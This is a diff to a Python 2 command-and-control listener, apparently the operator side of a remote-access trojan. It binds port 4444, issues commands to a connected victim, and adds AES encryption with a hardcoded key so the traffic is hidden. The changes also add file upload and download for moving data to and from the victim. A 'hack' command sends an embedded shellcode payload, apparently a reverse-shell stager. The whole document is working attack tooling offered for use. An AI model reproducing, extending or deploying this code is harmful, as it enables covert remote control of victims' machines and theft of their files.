@@ -8,13 +8,13 @@ from Crypto.Cipher import AES
 import base64
 
 
-unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+
 BLOCK_SIZE = 32  # Bytes
+unpad = lambda s: s[:-ord(s[len(s) - 1:])]
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                 chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 try:
     s.bind(("0.0.0.0", 4444))
 except socket.error, v:
@@ -33,7 +33,6 @@ print "[+] Listening to the incoming connection on port 4444..."
 def do_decrypt(ciphertext):
     obj2 = AES.new('This_is_a_key123', AES.MODE_ECB)
     message = obj2.decrypt(ciphertext)
-    print message
     return unpad(message)
 
 def do_encrypt(message):
@@ -48,18 +47,25 @@ def do_encrypt(message):
 def clienthandle(client) :
     while True :
         command = raw_input('ElGatoAsesino> ')
-        client.send(command)
+        commencrpt = do_encrypt(command)
+        client.send(commencrpt)
 
         if command == 'quit' :
             break
-        if 'download' in command:
-            #print buf
-            #encreply = pickle.loads(buf)
+        elif 'download' in command:
             a = command.replace("download","")
             a = a.replace(" ", "")
-            with open("copy"+a, 'a') as f:
+            with open("copy"+a, 'wb') as f:
                 buf = client.recv(35000)
+                buf = do_decrypt(buf)
                 f.write(buf)
+        elif 'upload' in command:
+            a = command.replace("upload","")
+            a = a.replace(" ", "")
+            with open(a, 'rb') as f:
+                buf = f.read(350000)
+                buf = do_encrypt(buf)
+                client.send(buf)
         elif "hack" in command:
             shellcode = bytearray(
                 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
@@ -84,12 +90,13 @@ def clienthandle(client) :
                 "\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
                 "\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85"
                 "\xf6\x75\xec\xc3")
+            #shellcode = do_encrypt(shellcode)
             client.send(shellcode)
+
         else:
-            buf = client.recv(1024)
+            buf = client.recv(10000)
             encreply =buf
             print do_decrypt(encreply)
-        #print key.decrypt(encreply)
 
 while True:
     (client, (ip, port)) = s.accept()
